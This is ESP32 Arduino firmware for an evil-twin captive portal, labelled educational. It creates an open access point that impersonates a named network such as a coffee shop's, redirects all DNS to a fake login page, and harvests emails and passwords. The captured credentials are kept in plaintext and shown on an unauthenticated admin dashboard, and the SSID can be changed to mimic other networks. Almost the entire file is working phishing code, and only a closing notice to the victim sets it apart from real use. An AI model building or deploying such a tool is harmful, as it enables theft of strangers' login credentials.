/*
 * ESP Captive Portal ATK - firmware.ino
 * Educational tool demonstrating captive portal attack vectors.
 * Creates a convincing AP that mimics a legitimate network's
 * captive portal to teach about Wi-Fi phishing awareness.
 *
 * Hardware: ESP32 DevKit (no extra components)
 * FOR EDUCATIONAL USE ONLY - Use on your own networks.
 */

#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>
#include <esp_wifi.h>

// ---------- Config ----------
#define LED_PIN    2
#define BTN_START  4
#define DNS_PORT  53
#define WEB_PORT  80

DNSServer dnsServer;
WebServer webServer(WEB_PORT);

// ---------- Target network (configure per exercise) ----------
static char targetSSID[33] = "CoffeeShop_WiFi";
static bool attackActive = false;
static uint32_t capturedCredentials = 0;
static uint32_t totalVisitors = 0;

// ---------- Credential log (educational tracking) ----------
#define MAX_LOG 16
typedef struct {
  char username[32];
  char password[32];
  char clientIP[16];
  unsigned long timestamp;
} CredLog;

static CredLog credLog[MAX_LOG];
static int logCount = 0;

// ---------- Portal pages ----------
void handlePortalPage() {
  totalVisitors++;
  String html = R"(<!DOCTYPE html><html><head>
<meta name='viewport' content='width=device-width, initial-scale=1'>
<title>Network Login</title>
<style>
body{font-family:-apple-system,Arial;background:#f5f5f5;margin:0;padding:20px}
.container{max-width:360px;margin:40px auto;background:white;border-radius:12px;padding:30px;box-shadow:0 4px 20px rgba(0,0,0,0.1)}
h2{color:#333;text-align:center;margin-bottom:24px}
.logo{text-align:center;font-size:40px;margin-bottom:10px}
input{width:100%;padding:12px;margin:8px 0;border:1px solid #ddd;border-radius:8px;font-size:16px;box-sizing:border-box}
button{width:100%;padding:14px;background:#007bff;color:white;border:none;border-radius:8px;font-size:16px;cursor:pointer;margin-top:12px}
.note{text-align:center;color:#888;font-size:12px;margin-top:16px}
</style></head><body>
<div class='container'>
<div class='logo'>&#128274;</div>
<h2>)";
  html += String(targetSSID);
  html += R"(</h2>
<p style='text-align:center;color:#666'>Please sign in to access the internet</p>
<form action='/login' method='POST'>
<input type='email' name='email' placeholder='Email address' required>
<input type='password' name='password' placeholder='Password' required>
<button type='submit'>Connect</button>
</form>
<div class='note'>By connecting, you agree to our terms of service.</div>
</div></body></html>)";
  webServer.send(200, "text/html", html);
}

void handleLogin() {
  String email = webServer.arg("email");
  String pass = webServer.arg("password");
  String clientIP = webServer.client().remoteIP().toString();

  capturedCredentials++;
  Serial.printf("[PORTAL] Credential captured from %s\n", clientIP.c_str());

  if (logCount < MAX_LOG) {
    strncpy(credLog[logCount].username, email.c_str(), 31);
    strncpy(credLog[logCount].password, pass.c_str(), 31);
    strncpy(credLog[logCount].clientIP, clientIP.c_str(), 15);
    credLog[logCount].timestamp = millis();
    logCount++;
  }

  // Show success and redirect
  String html = R"(<!DOCTYPE html><html><head>
<meta http-equiv='refresh' content='3;url=http://portal.local/success'>
<title>Connecting...</title>
<style>body{font-family:Arial;text-align:center;margin-top:100px}</style>
</head><body><h1>&#10004; Connecting...</h1>
<p>Please wait while we authenticate your account.</p>
</body></html>)";
  webServer.send(200, "text/html", html);
}

void handleSuccess() {
  webServer.send(200, "text/html",
    "<html><body style='text-align:center;margin-top:100px'>"
    "<h1>Connected!</h1><p>You are now online.</p>"
    "<p style='color:red'><b>EDUCATIONAL DEMO:</b> Your credentials were captured. "
    "This demonstrates why you should never enter real credentials on captive portals "
    "you don't trust.</p></body></html>");
}

// Admin dashboard
void handleAdmin() {
  String html = "<html><head><title>Admin Dashboard</title></head><body>";
  html += "<h1>Captive Portal ATK - Dashboard</h1>";
  html += "<p>Target SSID: " + String(targetSSID) + "</p>";
  html += "<p>Visitors: " + String(totalVisitors);
  html += " | Captured: " + String(capturedCredentials) + "</p>";
  html += "<table border='1'><tr><th>Time</th><th>IP</th><th>Email</th><th>Pass</th></tr>";
  for (int i = 0; i < logCount; i++) {
    html += "<tr><td>" + String(credLog[i].timestamp / 1000) + "s</td>";
    html += "<td>" + String(credLog[i].clientIP) + "</td>";
    html += "<td>" + String(credLog[i].username) + "</td>";
    html += "<td>" + String(credLog[i].password) + "</td></tr>";
  }
  html += "</table><hr>";
  html += "<form action='/config' method='POST'>New SSID: ";
  html += "<input name='ssid' value='" + String(targetSSID) + "'>";
  html += "<input type='submit' value='Update'></form>";
  html += "</body></html>";
  webServer.send(200, "text/html", html);
}

void handleConfig() {
  String ssid = webServer.arg("ssid");
  if (ssid.length() > 0 && ssid.length() < 33) {
    strncpy(targetSSID, ssid.c_str(), 32);
    WiFi.softAP(targetSSID, NULL, 6);
    Serial.printf("[CONFIG] SSID changed to: %s\n", targetSSID);
  }
  webServer.sendHeader("Location", "/admin");
  webServer.send(302);
}

void handleRedirect() {
  webServer.sendHeader("Location", "http://portal.local/");
  webServer.send(302, "text/plain", "");
}

// ---------- Setup ----------
void setup() {
  Serial.begin(115200);
  Serial.println("[CaptiveATK] Starting...");
  pinMode(LED_PIN, OUTPUT);
  pinMode(BTN_START, INPUT_PULLUP);

  WiFi.mode(WIFI_AP);
  WiFi.softAP(targetSSID, NULL, 6);
  delay(100);

  dnsServer.setErrorReplyCode(DNSReplyCode::NoError);
  dnsServer.start(DNS_PORT, "*", WiFi.softAPIP());

  webServer.on("/", handlePortalPage);
  webServer.on("/login", HTTP_POST, handleLogin);
  webServer.on("/success", handleSuccess);
  webServer.on("/admin", handleAdmin);
  webServer.on("/config", HTTP_POST, handleConfig);
  webServer.on("/generate_204", handleRedirect);
  webServer.on("/hotspot-detect.html", handleRedirect);
  webServer.onNotFound(handleRedirect);
  webServer.begin();

  Serial.printf("[CaptiveATK] AP: %s  IP: %s\n",
                targetSSID, WiFi.softAPIP().toString().c_str());
  Serial.println("[CaptiveATK] Admin: http://<IP>/admin");
}

// ---------- Main loop ----------
void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();

  digitalWrite(LED_PIN, WiFi.softAPgetStationNum() > 0);
  delay(10);
}
